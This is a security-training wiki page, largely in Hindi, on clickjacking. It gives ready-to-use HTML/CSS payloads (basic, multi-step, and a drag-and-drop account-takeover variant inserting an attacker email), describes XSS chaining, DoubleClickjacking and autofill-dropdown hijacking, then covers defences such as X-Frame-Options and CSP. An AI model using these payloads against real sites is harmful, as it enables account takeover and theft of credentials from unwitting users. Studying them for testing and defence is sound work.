# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjacking क्या है

एक Clickjacking attack में, एक **उपयोगकर्ता** को किसी वेबपेज पर किसी **तत्व** पर **क्लिक** करने के लिए **धोखा** दिया जाता है जो या तो **अदृश्य** होता है या किसी अन्य तत्व के रूप में छिपा होता है। यह हेरफेर उपयोगकर्ता के लिए अनपेक्षित परिणामों का कारण बन सकता है, जैसे कि malware का डाउनलोड होना, दुर्भावनापूर्ण वेबपेजों पर रीडायरेक्ट होना, credentials या संवेदनशील जानकारी का प्रदान, पैसे का हस्तांतरण, या उत्पादों की ऑनलाइन खरीद।

### फॉर्म पहले से भरने की ट्रिक

**कभी-कभी पृष्ठ लोड करते समय GET parameters का उपयोग करके किसी फॉर्म के फ़ील्ड के मान भरना संभव होता है।** एक हमलावर इस व्यवहार का दुरुपयोग करके किसी फॉर्म को मनमाना डेटा देकर भर सकता है और clickjacking payload भेज सकता है ताकि उपयोगकर्ता Submit बटन दबा दे।

### Drag\&Drop के साथ फॉर्म भरना

यदि आपको उपयोगकर्ता से **फॉर्म भरवाना** है लेकिन आप सीधे उससे कुछ विशेष जानकारी लिखने के लिए नहीं कहना चाहते (जैसे email या कोई विशेष password जिसे आप जानते हैं), तो आप बस उनसे कुछ **Drag\&Drop** करने को कह सकते हैं जो आपकी नियंत्रित जानकारी लिख देगा, जैसे [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### बहु-चरण Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

यदि आपने एक **XSS attack that requires a user to click** ऐसे element में पहचाना है जिससे XSS **trigger** होता है और पेज **vulnerable to clickjacking** है, तो आप उपयोगकर्ता को बटन/लिंक पर क्लिक करवाने के लिए इसका दुरुपयोग कर सकते हैं।\
Example:\
आपको account के कुछ private विवरणों में **self XSS** मिला (ऐसे विवरण जो **only you can set and read** कर सकते हैं)। उन विवरणों को सेट करने वाला पेज जिसमें **form** है वह **vulnerable** है **Clickjacking** के लिए और आप **prepopulate** कर सकते हैं उस **form** को GET parameters के साथ।\
एक attacker उस पेज पर **Clickjacking** attack तैयार कर सकता है, **prepopulating** the **form** के साथ **XSS payload** डालकर और **tricking** the **user** को **Submit** करने के लिए मजबूर कर सकता है। तो, **when the form is submitted** और मान बदल दिए जाते हैं, तो **user will execute the XSS**।


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), यह तकनीक victim से कहेगी कि वे किसी custom पेज के एक specific स्थान पर बने बटन पर double click करें, और mousedown और onclick events के बीच के timing differences का उपयोग करके double click के दौरान victim पेज लोड कर दे ताकि **victim actually clicks a legit button in the victim page**।

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> यह तकनीक उपयोगकर्ता को victim पेज के एक ही स्थान पर क्लिक करने के लिए trick करने की अनुमति देती है, जो clickjacking के खिलाफ हर सुरक्षा को bypass कर सकती है। इसलिए attacker को ऐसे **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions** ढूंढने होंगे।

### Browser extensions: DOM-based autofill clickjacking

iframe करके victim पेजों के अलावा, attackers browser extension के UI elements को target कर सकते हैं जो पेज में inject किए जाते हैं। Password managers focused inputs के पास autofill dropdowns render करते हैं; एक attacker-controlled field को focus करके और extension के dropdown को hide/occlude करके (opacity/overlay/top-layer tricks), जब user को मजबूर किया जाए तो उस क्लिक से stored item select हो सकता है और sensitive data attacker-controlled inputs में भर दी जाती है। यह variant किसी iframe exposure की जरूरत नहीं करता और पूरी तरह DOM/CSS manipulation के माध्यम से काम करता है।

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Client side पर executed scripts Clickjacking रोकने के लिए निम्न कर सकते हैं:

- यह सुनिश्चित करना कि application window main या top window हो।
- सभी frames को visible बनाना।
- invisible frames पर क्लिक रोकना।
- potential Clickjacking प्रयासों का पता लगाना और उपयोगकर्ताओं को alert करना।

हालाँकि, ये frame-busting scripts circumvent किए जा सकते हैं:

- **Browsers' Security Settings:** कुछ browsers इन scripts को उनके security settings या JavaScript support की कमी के आधार पर block कर सकते हैं।
- **HTML5 iframe sandbox Attribute:** एक attacker frame buster scripts को neutralize कर सकता है iframe पर sandbox attribute सेट करके — जैसे allow-forms या allow-scripts मानों के साथ, बिना allow-top-navigation के। इससे iframe यह verify नहीं कर पाएगा कि क्या वह top window है, e.g.
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The allow-forms और allow-scripts values iframe के भीतर क्रियाएँ सक्षम करते हैं जबकि top-level navigation को अक्षम करते हैं। लक्षित साइट की अपेक्षित कार्यक्षमता सुनिश्चित करने के लिए, attack type के अनुसार allow-same-origin और allow-modals जैसे अतिरिक्त permissions आवश्यक हो सकते हैं। ब्राउज़र कंसोल संदेश यह मार्गदर्शन कर सकते हैं कि कौन-सी permissions.allow करनी चाहिए।

### Server-Side Defenses

#### X-Frame-Options

The **X-Frame-Options HTTP response header** ब्राउज़र को सूचित करता है कि किसी पृष्ठ को <frame> या <iframe> में रेंडर करना वैध है या नहीं, और यह Clickjacking को रोकने में मदद करता है:

- X-Frame-Options: deny - कोई भी domain कंटेंट को फ्रेम नहीं कर सकता।
- X-Frame-Options: sameorigin - केवल वर्तमान साइट कंटेंट को फ्रेम कर सकती है।
- X-Frame-Options: allow-from https://trusted.com - केवल निर्दिष्ट 'uri' पृष्ठ को फ्रेम कर सकता है।
- ध्यान दें सीमितताएँ: अगर ब्राउज़र इस निर्देश का समर्थन नहीं करता तो यह काम नहीं कर सकता। कुछ ब्राउज़र CSP frame-ancestors निर्देश को प्राथमिकता देते हैं।

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** Clickjacking सुरक्षा के लिए सुझाया गया तरीका है:

- frame-ancestors 'none' - X-Frame-Options: deny के समान।
- frame-ancestors 'self' - X-Frame-Options: sameorigin के समान।
- frame-ancestors trusted.com - X-Frame-Options: allow-from के समान।

उदाहरण के लिए, निम्न CSP केवल उसी डोमेन से framing की अनुमति देता है:

Content-Security-Policy: frame-ancestors 'self';

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with child-src and frame-src

**Content Security Policy (CSP)** एक सुरक्षा उपाय है जो यह निर्दिष्ट करके Clickjacking और अन्य code injection attacks को रोकने में मदद करता है कि ब्राउज़र किस स्रोतों से कंटेंट लोड करने की अनुमति दे।

#### frame-src Directive

- Defines valid sources for frames.
- More specific than the default-src directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
यह नीति समान origin (self) और https://trusted-website.com से फ्रेम्स की अनुमति देती है।

#### child-src Directive

- CSP level 2 में पेश किया गया ताकि web workers और frames के लिए मान्य स्रोत सेट किए जा सकें।
- frame-src और worker-src के लिए यह एक fallback के रूप में काम करता है।
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
यह नीति same origin (self) और https://trusted-website.com से आने वाले frames और workers की अनुमति देती है।

**उपयोग नोट्स:**

- अप्रचलन: child-src को frame-src और worker-src के पक्ष में चरणबद्ध रूप से हटाया जा रहा है।
- फॉलबैक व्यवहार: यदि frame-src अनुपस्थित है, तो frames के लिए child-src को फॉलबैक के रूप में उपयोग किया जाता है। यदि दोनों अनुपस्थित हैं, तो default-src लागू होता है।
- कड़ा स्रोत परिभाषा: निर्देशों में केवल विश्वसनीय स्रोत ही शामिल करें ताकि दुरुपयोग रोका जा सके।

#### JavaScript Frame-Breaking Scripts

हालाँकि यह पूरी तरह से भरोसेमंद नहीं है, JavaScript-based frame-busting scripts का उपयोग किसी वेब पृष्ठ को फ्रेम किए जाने से रोकने के लिए किया जा सकता है। उदाहरण:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens का उपयोग

- **Token Validation:** वेब एप्लिकेशन में anti-CSRF tokens का उपयोग करें ताकि यह सुनिश्चित हो सके कि state-changing अनुरोध उपयोगकर्ता की स्पष्ट मंशा से किए गए हों और किसी Clickjacked page के माध्यम से नहीं।

## References

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
